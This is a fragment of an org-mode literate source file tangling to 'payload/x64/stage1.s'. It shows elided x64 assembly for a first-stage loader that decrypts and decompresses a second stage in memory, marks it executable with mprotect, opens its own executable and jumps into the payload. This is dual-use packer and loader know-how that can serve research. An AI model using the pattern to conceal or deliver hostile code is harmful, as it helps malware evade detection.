...
#+begin_src asm :tangle payload/x64/stage1.s :mkdirp yes
  ...
  .return_crypt_compress_addr:
  	pop rsi		;src;;[rsp] (len) s2
  	mov rdx, 	0xfefffffffffff000	;[rsp] (len) s2
  	sub rsp, rdx
  	push rsp		;dest
  	pop rdi
  	push rdx	;[rsp] size_buffer_decrypt, decrypt_buffer,(len) s2
  	...
  	add rsp, rdx ;Restore stack [rsp] (len) s2
  	test rax, rax
  	jnz _exit
  ...
  .mprotect_stage_2:
  	...
  	push 0x5
  	pop rdx			;prot R-X
  	pop rsi			;size_s2_elf [rsp] argc, argv
  	push r13		;[rsp] (va) s2
  	push rsi		;[rsp] (len, va) s2
  	push 0xA
  ...
  .vaddr_stage1:
  	...
  	push rax			;[rsp] = (vaddr) s1, (len, va) s2
  	mov rsi,  0xfefffffffffff000	; (len) s1
  	push rsi			;[rsp] = (len, vaddr) s1, (len, va) s2
  	call .open
  .proc_self_exec:
  ...
  .open:
  	...
  	pop rax
  	syscall
  	push rax		;[rsp] (fd, len, va) s1, (len, va) s2
  	test rax, rax
  	js _exit
  .jmp_stage_2:
  	pop rsi
  	...
  	add rax, r13		;Not mutate rax, and r13, r15
  	pop r14			;r14 (fd) s1
  	pop r12			;r12 (len) s1
  	pop r11			;r11 (va) s1
  	pop r10			;r10 (len) s2
  	pop r9			;r9 (va) s2
  	push r11		;[rsp] (va) s1
  	push r12 		;[rsp] (len, va) s1
  	push r14		;[rsp] (fd, len, va) s1
  	push r9			;[rsp] (va) s2, (fd, len, va) s1
  	push r10		;[rsp] (len, va) s2, (fd, len, va) s1
  	push rax
